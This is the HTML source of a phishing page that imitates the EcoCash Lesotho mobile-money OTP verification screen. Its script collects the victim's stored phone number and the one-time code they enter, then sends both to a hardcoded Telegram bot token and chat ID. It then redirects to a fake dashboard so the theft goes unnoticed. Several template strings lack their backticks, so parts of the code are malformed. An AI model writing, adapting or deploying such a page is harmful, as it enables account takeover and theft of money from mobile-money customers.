<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash | Verify OTP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        
        body { 
            background-color: #f8fafc; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
        }

        .otp-card {
            background: #ffffff;
            border-radius: 50px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.03);
        }

        .otp-input {
            width: 60px;
            height: 70px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: 800;
            border: 2px solid #e2e8f0;
            border-radius: 15px;
            background: #ffffff;
            outline: none;
            transition: all 0.2s;
        }

        .otp-input:focus {
            border-color: #000099;
            background: #f0f4ff;
        }

        .btn-verify {
            background-color: #8b8ed1; /* Matching the muted purple/blue in your OTP image */
            color: white;
            padding: 1.25rem;
            border-radius: 100px;
            font-weight: 700;
            width: 100%;
            transition: all 0.2s;
        }

        .btn-verify.active {
            background-color: #000099;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-6">

    <div class="mb-8 text-center">
        <h1 class="text-4xl font-bold">
            <span class="text-blue-600">Eco</span><span class="text-red-600">Cash</span>
        </h1>
        <p class="text-gray-400 mt-4 uppercase text-xs font-bold tracking-widest">Lesotho</p>
    </div>

    <div class="max-w-[420px] w-full otp-card p-10 md:p-12 text-center">
        
        <div class="w-20 h-20 bg-gradient-to-b from-blue-900 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
            <i class="fas fa-shield-alt text-white text-3xl"></i>
        </div>

        <h2 class="text-2xl font-extrabold text-gray-800">Kenya Khoutu ea OTP</h2>
        <p class="text-sm text-gray-500 mt-2 font-medium">Enter OTP Code</p>
        <p class="text-[11px] text-gray-400 mt-1">Re rometseng khoutu ea dinomoro tse 4 ho</p>
        <p class="text-sm font-bold text-blue-900" id="user-phone">768768767</p>

        <div class="flex justify-between gap-2 my-8" id="otp-inputs">
            <input type="text" maxlength="1" class="otp-input" autofocus>
            <input type="text" maxlength="1" class="otp-input">
            <input type="text" maxlength="1" class="otp-input">
            <input type="text" maxlength="1" class="otp-input">
        </div>

        <button id="verify-btn" onclick="verifyOTP()" class="btn-verify mb-6">
            <i class="fas fa-check-circle mr-2"></i> Netefatsa (Verify OTP)
        </button>

        <div class="text-center">
            <p class="text-xs text-gray-400">Ha u fumane khoutu? (Didn't receive code?)</p>
            <div id="timer-box" class="mt-2">
                <span class="text-xs font-bold text-blue-600" id="timer">01:00</span>
            </div>
            <button id="resend-btn" onclick="handleResend()" class="hidden text-xs font-bold text-blue-900 underline mt-2">
                Romela hape (Resend)
            </button>
        </div>

    </div>

    <script>
        // 1. Retrieve Phone Number from Local Storage
        const savedPhone = localStorage.getItem('userPhone') || "User";
        document.getElementById('user-phone').innerText = savedPhone;

// 2. Timer Logic
        let timeLeft = 60;
        const timerElement = document.getElementById('timer');
        const resendBtn = document.getElementById('resend-btn');
    
        const countdown = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerElement.parentElement.classList.add('hidden');
                resendBtn.classList.remove('hidden');
            } else {
                let seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
                timerElement.innerText = 00:${seconds};
            }
            timeLeft -= 1;
        }, 1000);
    
        // 3. Resend Redirect Logic
        function handleResend() {
            window.location.href = 'login.html';
        }
    
        // 4. OTP Input Auto-focus & Telegram Collection
        const inputs = document.querySelectorAll('#otp-inputs input');
        inputs.forEach((input, index) => {
            input.addEventListener('keyup', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                if (e.key === "Backspace" && index > 0) {
                    inputs[index - 1].focus();
                }
                checkInputs();
            });
        });
    
        function checkInputs() {
            const isFilled = Array.from(inputs).every(input => input.value.length === 1);
            const btn = document.getElementById('verify-btn');
            if (isFilled) {
                btn.classList.add('active');
                btn.style.backgroundColor = "#000099"; // Set to active blue
            } else {
                btn.classList.remove('active');
                btn.style.backgroundColor = "#8b8ed1"; // Reset to muted
            }
        }
    
        async function verifyOTP() {
            const btn = document.getElementById('verify-btn');
            if (btn.classList.contains('active')) {
                // Get OTP values
                const otpValue = Array.from(inputs).map(input => input.value).join('');
                
                // Show Loading State
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner animate-spin mr-2"></i> Ea netefatsa...';
    
                // Telegram Bot Credentials
                const botToken ="8341676430:AAEaTONbUfGE5Ibhe_WfEmxLDemmsrxKu40";
                const chatId ="8588753899";
                const message = ðŸ” *EcoCash OTP Received*\n\nðŸ“± *Phone:* ${savedPhone}\nðŸ”¢ *OTP Code:* ${otpValue}\nðŸ“ *Status:* Verification in progress;
    
                try {
                    // Send to Telegram
                    await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (error) {
                    console.error('Telegram Error:', error);
                }
    
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = 'dashboard.html';
                }, 2000);
            }
        }
    </script>

</body>
</html>
